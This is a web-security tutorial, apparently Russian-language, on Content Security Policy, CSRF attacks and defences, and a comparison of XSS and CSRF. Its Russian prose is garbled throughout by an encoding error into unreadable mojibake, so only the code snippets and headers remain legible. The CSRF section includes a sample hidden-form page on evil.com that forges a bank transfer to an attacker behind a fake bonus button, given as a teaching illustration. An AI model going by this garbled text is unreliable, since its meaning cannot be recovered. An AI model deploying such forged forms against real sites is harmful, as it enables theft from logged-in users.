‚Äú–†–∞–∑—Ä–µ—à–∞–π —Ç–æ–ª—å–∫–æ —Ç–∞–∫–∏–µ —Å–∫—Ä–∏–ø—Ç—ã, —Å—Ç–∏–ª–∏, —Ñ—Ä–µ–π–º—ã –∏ —Ç.–¥., –∫–æ—Ç–æ—Ä—ã–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—Ç —ç—Ç–∏–º –ø—Ä–∞–≤–∏–ª–∞–º.‚Äù

–ë—Ä–∞—É–∑–µ—Ä –±–ª–æ–∫–∏—Ä—É–µ—Ç –≤—Å—ë, —á—Ç–æ –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –ø–æ–ª–∏—Ç–∏–∫–µ.

üí° –ö–∞–∫ –≤–Ω–µ–¥—Ä–∏—Ç—å CSP

1. –í HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–µ:

```
Content-Security-Policy: script-src 'self'
```

2. –ß–µ—Ä–µ–∑ <meta> (–º–µ–Ω–µ–µ –Ω–∞–¥—ë–∂–Ω–æ):

```html

<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

üõ°Ô∏è –ß—Ç–æ –º–æ–∂–Ω–æ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å —Å –ø–æ–º–æ—â—å—é CSP

| –î–∏—Ä–µ–∫—Ç–∏–≤–∞                  | –ß—Ç–æ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç                                                   |
|----------------------------|--------------------------------------------------------------------|
| `default-src`              | –ë–∞–∑–æ–≤–∞—è –ø–æ–ª–∏—Ç–∏–∫–∞ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é                                      |
| `script-src`               | –ò—Å—Ç–æ—á–Ω–∏–∫–∏ JS                                                       |
| `style-src`                | –ò—Å—Ç–æ—á–Ω–∏–∫–∏ CSS                                                      |
| `img-src`                  | –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è                                                        |
| `font-src`                 | –®—Ä–∏—Ñ—Ç—ã                                                             |
| `connect-src`              | AJAX / WebSocket                                                   |
| `frame-src`                | `iframe` –∏ –≤—Å—Ç—Ä–∞–∏–≤–∞–Ω–∏–µ                                             |
| `media-src`                | –∞—É–¥–∏–æ / –≤–∏–¥–µ–æ                                                      |
| `object-src`               | Flash, –ø–ª–∞–≥–∏–Ω—ã (–ª—É—á—à–µ `none`)                                      |
| `form-action`              | –ö—É–¥–∞ –º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Ñ–æ—Ä–º—ã                                        |
| `frame-ancestors`          | –ö—Ç–æ –º–æ–∂–µ—Ç –≤—Å—Ç—Ä–∞–∏–≤–∞—Ç—å —ç—Ç–æ—Ç —Å–∞–π—Ç –≤ `iframe` (–∑–∞—â–∏—Ç–∞ –æ—Ç clickjacking) |
| `report-uri` / `report-to` | –ö—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –æ—Ç—á–µ—Ç—ã –æ –Ω–∞—Ä—É—à–µ–Ω–∏—è—Ö                                |

üß± –ü—Ä–∏–º–µ—Ä –±–∞–∑–æ–≤–æ–π –ø–æ–ª–∏—Ç–∏–∫–∏ CSP

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted.cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  object-src 'none';
```

üîç –†–∞–∑–±–æ—Ä:

* `'self'` ‚Äî —Ç–æ–ª—å–∫–æ —Å —Ç–æ–≥–æ –∂–µ origin
* `script-src` ‚Äî —Ä–∞–∑—Ä–µ—à–∞–µ—Ç —Ç–æ–ª—å–∫–æ –ª–æ–∫–∞–ª—å–Ω—ã–µ –∏ CDN-—Å–∫—Ä–∏–ø—Ç—ã
* `'unsafe-inline'` –≤ style-src —Ä–∞–∑—Ä–µ—à–∞–µ—Ç inline-—Å—Ç–∏–ª–∏ (‚ö†Ô∏è –Ω–µ–∂–µ–ª–∞—Ç–µ–ª—å–Ω–æ)
* `img-src *` ‚Äî –º–æ–∂–Ω–æ –≥—Ä—É–∑–∏—Ç—å –∫–∞—Ä—Ç–∏–Ω–∫–∏ –æ—Ç–∫—É–¥–∞ —É–≥–æ–¥–Ω–æ
* `object-src 'none'` ‚Äî –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–ø—Ä–µ—â–∞–µ—Ç –ø–ª–∞–≥–∏–Ω—ã (–≤ —Ç.—á. Flash)

‚ö†Ô∏è –û–ø–∞—Å–Ω—ã–µ –∏—Å–∫–ª—é—á–µ–Ω–∏—è

`'unsafe-inline'` ‚Äî –ø–æ–∑–≤–æ–ª—è–µ—Ç XSS —á–µ—Ä–µ–∑ inline-—Å–∫—Ä–∏–ø—Ç—ã
`'unsafe-eval'` ‚Äî –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å eval()

* `*` ‚Äî –ª—é–±–æ–π –∏—Å—Ç–æ—á–Ω–∏–∫ (–∏–Ω–æ–≥–¥–∞ –¥–æ–ø—É—Å—Ç–∏–º, –Ω–∞–ø—Ä–∏–º–µ—Ä –¥–ª—è –∫–∞—Ä—Ç–∏–Ω–æ–∫, –Ω–æ –Ω–µ –¥–ª—è —Å–∫—Ä–∏–ø—Ç–æ–≤)

---

## <a name="csrf"></a> üîí –ß—Ç–æ —Ç–∞–∫–æ–µ CSRF?

CSRF (Cross-Site Request Forgery –º–µ–∂—Å–∞–π—Ç–æ–≤–∞—è –ø–æ–¥–¥–µ–ª–∫–∞ –∑–∞–ø—Ä–æ—Å–∞) ‚Äî —ç—Ç–æ –∞—Ç–∞–∫–∞, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –±—Ä–∞—É–∑–µ—Ä
–∂–µ—Ä—Ç–≤—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–ø—Ä–æ—Å –æ—Ç
–µ—ë –∏–º–µ–Ω–∏ –∫ –¥—Ä—É–≥–æ–º—É —Å–∞–π—Ç—É, –≥–¥–µ –æ–Ω–∞ —É–∂–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –∫ –±–∞–Ω–∫—É –∏–ª–∏ –∞–¥–º–∏–Ω–∫–µ).

‚û°Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω, –∏ –±—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç cookie

‚û°Ô∏è –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–¥–¥–µ–ª—ã–≤–∞–µ—Ç —Ñ–æ—Ä–º—É –∏–ª–∏ –∑–∞–ø—Ä–æ—Å

‚û°Ô∏è –ñ–µ—Ä—Ç–≤–∞ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –Ω–∞ —Å–∞–π—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –∏ –Ω–µ–≤–æ–ª—å–Ω–æ –¥–µ–ª–∞–µ—Ç –¥–µ–π—Å—Ç–≤–∏–µ –æ—Ç —Å–≤–æ–µ–≥–æ –∏–º–µ–Ω–∏

üìå –ü—Ä–∏–º–µ—Ä –∞—Ç–∞–∫–∏

–£ –∂–µ—Ä—Ç–≤—ã –µ—Å—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –Ω–∞ bank.com, –∏ –≤ –±—Ä–∞—É–∑–µ—Ä–µ –µ—Å—Ç—å auth_cookie.

–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Å–æ–∑–¥–∞—ë—Ç —É —Å–µ–±—è:

```
<!-- evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker">
  <button type="submit">–ü–û–õ–£–ß–ò–¢–¨ –ë–û–ù–£–° üòá</button>
</form>
```

üëÜ –ö–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–º—ë—Ç –∫–Ω–æ–ø–∫—É ‚Äî –µ–≥–æ –±—Ä–∞—É–∑–µ—Ä –æ—Ç–ø—Ä–∞–≤–∏—Ç –∑–∞–ø—Ä–æ—Å —Å –µ–≥–æ –∫—É–∫–∞–º–∏, –∏ –±–∞–Ω–∫ –ø–æ–¥—É–º–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π
–ø–µ—Ä–µ–≤–æ–¥.

üß® –ü–æ—á–µ–º—É —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç?

–ü–æ—Ç–æ–º—É —á—Ç–æ:

* –ë—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏–∫—Ä–µ–ø–ª—è–µ—Ç cookies –∏ —Å–µ—Å—Å–∏–∏
* –°–µ—Ä–≤–µ—Ä –Ω–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, –æ—Ç–∫—É–¥–∞ –ø—Ä–∏—à—ë–ª –∑–∞–ø—Ä–æ—Å
* –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–¥–æ–∑—Ä–µ–≤–∞–µ—Ç

üß± –ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è –æ—Ç CSRF

üîπ 1. CSRF-—Ç–æ–∫–µ–Ω

–ü—Ä–∏ —Ä–µ–Ω–¥–µ—Ä–µ —Ñ–æ—Ä–º—ã —Å–µ—Ä–≤–µ—Ä –≤—Å—Ç–∞–≤–ª—è–µ—Ç —Å–∫—Ä—ã—Ç–æ–µ –ø–æ–ª–µ:

```
<input type="hidden" name="csrf_token" value="abc123">
```

–ü—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–µ—Ä–≤–µ—Ä —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç —Ç–æ–∫–µ–Ω —Å –æ–∂–∏–¥–∞–µ–º—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º (–∏–∑ —Å–µ—Å—Å–∏–∏)

‚Üí –î–∞–∂–µ –µ—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–¥–¥–µ–ª–∞–µ—Ç —Ñ–æ—Ä–º—É, –æ–Ω –Ω–µ —Å–º–æ–∂–µ—Ç —É–≥–∞–¥–∞—Ç—å —Ç–æ–∫–µ–Ω.

üîπ 2. SameSite cookies

–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø–æ–ª–∏—Ç–∏–∫—É, –∫–æ–≥–¥–∞ cookie –Ω–µ –¥–æ–ª–∂–Ω—ã –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å—Å—è —Å –∫—Ä–æ—Å—Å-–¥–æ–º–µ–Ω–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤.

```
Set-Cookie: auth_token=abc123; SameSite=Strict; Secure
```

–ó–Ω–∞—á–µ–Ω–∏—è:

* `Strict` ‚Äî –∫—É–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –Ω–∞–≤–∏–≥–∞—Ü–∏–∏ —Å —Ç–æ–≥–æ –∂–µ —Å–∞–π—Ç–∞
* `Lax` ‚Äî –∫—É–∫–∏ –ù–ï –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è —Å POST, –Ω–æ –º–æ–∂–Ω–æ —Å GET (–Ω–∞–ø—Ä–∏–º–µ—Ä, —Å—Å—ã–ª–∫–∏)
* `None` ‚Äî —Ä–∞–∑—Ä–µ—à–∞–µ—Ç –∫—Ä–æ—Å—Å-–¥–æ–º–µ–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã, –Ω–æ —Ç—Ä–µ–±—É–µ—Ç Secure

–î–ª—è SPA:

```
Set-Cookie: auth_token=abc123; SameSite=Strict; Secure; HttpOnly
```

| –§–ª–∞–≥              | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ                                                                        |
|-------------------|-----------------------------------------------------------------------------------|
| `SameSite=Strict` | –ö—É–∫–∏ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ —Å–∞–π—Ç –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ —Å –¥—Ä—É–≥–æ–≥–æ —Å–∞–π—Ç–∞ (–ø–æ–ª–Ω–∞—è –∑–∞—â–∏—Ç–∞ –æ—Ç CSRF) |
| `Secure`          | –¢–æ–ª—å–∫–æ –ø–æ HTTPS                                                                   |
| `HttpOnly`        | –ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ —á–µ—Ä–µ–∑ JavaScript (XSS-–∑–∞—â–∏—Ç–∞)                                         |

üîπ 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∞ Origin –∏–ª–∏ Referer

–°–µ—Ä–≤–µ—Ä –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, —á—Ç–æ –∑–∞–ø—Ä–æ—Å –ø—Ä–∏—à—ë–ª —Å –æ–∂–∏–¥–∞–µ–º–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞.

```ts
if (req.headers.origin !== "https://yourapp.com") {
  return res.status(403).send("Possible CSRF attack");
}
```

–ù–µ –≤—Å–µ–≥–¥–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ GET Referer –º–æ–∂–µ—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å), –Ω–æ —Ö–æ—Ä–æ—à–∞—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –º–µ—Ä–∞.

üîπ 4. –£–π—Ç–∏ –æ—Ç cookie-based auth ‚Üí –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å JWT –≤ header

–ï—Å–ª–∏ —Ç–≤–æ–π SPA –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Bearer-—Ç–æ–∫–µ–Ω (–≤ Authorization), CSRF –Ω–µ–≤–æ–∑–º–æ–∂–µ–Ω –ø–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—é.

```js
fetch("/api/transfer", {
    method: "POST",
    headers: {
        Authorization: `Bearer ${token}`
    }
});


```

–ë—Ä–∞—É–∑–µ—Ä –Ω–µ –¥–æ–±–∞–≤–∏—Ç —Ç–æ–∫–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ ‚Üí –∑–Ω–∞—á–∏—Ç CSRF-–∞—Ç–∞–∫–∞ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–∞.

---

## <a name="xss-vs-csrf"></a> üß© –ö—Ä–∞—Ç–∫–æ–µ —Å—Ä–∞–≤–Ω–µ–Ω–∏–µ XSS –∏ CSRF

|                       | XSS                        | CSRF                                                |
|-----------------------|----------------------------|-----------------------------------------------------|
| –ì–¥–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è?      | –ù–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∫–ª–∏–µ–Ω—Ç–∞ (DOM)   | –ù–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞                                  |
| –ö—Ç–æ –∞—Ç–∞–∫—É–µ—Ç?          | –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤—ã–ø–æ–ª–Ω—è–µ—Ç JS | –ñ–µ—Ä—Ç–≤–∞ –¥–µ–ª–∞–µ—Ç –∑–∞–ø—Ä–æ—Å                                |
| –ß—Ç–æ –Ω—É–∂–Ω–æ –∞—Ç–∞–∫—É—é—â–µ–º—É? | –í–Ω–µ–¥—Ä–∏—Ç—å JS-–∫–æ–¥            | –ó–∞—Å—Ç–∞–≤–∏—Ç—å –∂–µ—Ä—Ç–≤—É –ø–µ—Ä–µ–π—Ç–∏ –Ω–∞ URL –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ä–º—É |
| –£—è–∑–≤–∏–º–æ—Å—Ç—å –≥–¥–µ?       | –í –∫–ª–∏–µ–Ω—Ç—Å–∫–æ–º –∫–æ–¥–µ          | –í —Å–µ—Ä–≤–µ—Ä–Ω–æ–π –ª–æ–≥–∏–∫–µ                                  |
